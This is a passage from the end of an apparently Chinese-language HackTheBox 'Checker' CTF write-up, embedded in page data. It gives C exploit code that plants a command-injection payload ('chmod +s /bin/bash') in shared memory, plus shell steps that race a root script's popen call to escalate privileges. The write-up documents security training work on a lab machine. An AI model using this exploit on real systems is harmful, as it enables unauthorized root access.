current_time = \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e(NULL);\n    srand((unsigned int)current_time);\n\n    // Generate a random number and apply modulo \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003exfffff to generate the key.\n    int random_value = rand();\n    key_t key = random_value % \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003exfffff;\n\n    // Print the generated key in hexadecimal.\n    printf(\"Generated key: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex%X\\n\", key);\n\n    // Create (or get) the shared memory segment with the generated key.\n    // IPC_CREAT flag is used to create the segment if it does not exist.\n    int shmid = shmget(key, SHM_SIZE, IPC_CREAT | SHM_MODE);\n    if (shmid == -\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) {\n        perror(\"shmget\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Attach to the shared memory segment.\n    char *shmaddr = (char *)shmat(shmid, NULL, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n    if (shmaddr == (char *)-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) {\n        perror(\"shmat\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Define the payload string to be written.\n    const char *payload = \"Leaked hash detected at Sat Feb \u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e \u003e '; chmod +s /bin/bash;#\";\n\n    // Write the payload to the shared memory segment.\n    snprintf(shmaddr, SHM_SIZE, \"%s\", payload);\n\n    // Optionally, print the content that was written.\n    printf(\"Shared Memory Content:\\n%s\\n\", shmaddr);\n\n    // Detach from the shared memory segment.\n    if (shmdt(shmaddr) == -\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) {\n        perror(\"shmdt\");\n        exit(EXIT_FAILURE);\n    }\n\n    return \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n}\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e开启两个\u003ccode\u003essh\u003c/code\u003e窗口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image25.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后上传exp \u003ccode\u003efuzzer.c\u003c/code\u003e 并编译\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egcc fuzzer.c -o fuzzer\n\u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e +x fuzzer\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e编译后在一个窗口执行循环，一个窗口执行\u003ccode\u003echeck-leak.sh\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e ./fuzzer; \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e执行\u003ccode\u003echeck-leak.sh\u003c/code\u003e 后，会有一秒在某块内存上可写的，并且最后会通过\u003ccode\u003epopen\u003c/code\u003e来执行那块内存上代码，通过循环条件竞争，将\u003ccode\u003epayload\u003c/code\u003e覆盖到将要执行的内存上，覆盖后，\u003ccode\u003epopen\u003c/code\u003e执行\u003ccode\u003echmod +s /bin/bash\u003c/code\u003e ，即可获得\u003ccode\u003eroot\u003c/code\u003e权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image26.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e任意文件读取双因子登录的相关的密钥和配置信息。提权是通过逆向分析找到漏洞触发任意代码执行（不会RE看着就是一脸懵）\u003c/p\u003e","title":"HackTheBox - Season7-Checker","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["HackTheBox","Linux靶机"],"categories":"靶机","description":"Season7 Checker https://app.hackthebox.com/competitive/7/overview | hard 前期踩点 首先将checker.htb添加到hosts文件 访问10.10.11.56:8080端口回会加载vault.checker.htb将写入hos..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxSeason7-Checker"},"buildId":"QNwQRHKrBrKUQsk8ffFzs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>